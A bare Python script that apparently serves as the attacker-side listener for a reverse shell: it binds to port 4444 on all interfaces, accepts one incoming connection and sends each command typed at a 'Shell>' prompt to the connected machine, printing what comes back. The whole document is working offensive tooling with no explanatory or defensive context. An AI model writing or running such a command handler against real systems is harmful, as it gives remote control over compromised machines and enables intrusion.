import socket

# Set up the listener
host = "0.0.0.0"  # Listen on all interfaces
port = 4444  # Choose any open port

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((host, port))
server.listen(1)

print(f"[*] Listening on {host}:{port}")

client, addr = server.accept()
print(f"[+] Connection from {addr}")

while True:
    command = input("Shell> ")  # Enter a command to send
    if command.lower() == "exit":
        break
    client.send(command.encode())
    response = client.recv(1024).decode()
    print(response)

client.close()
server.close()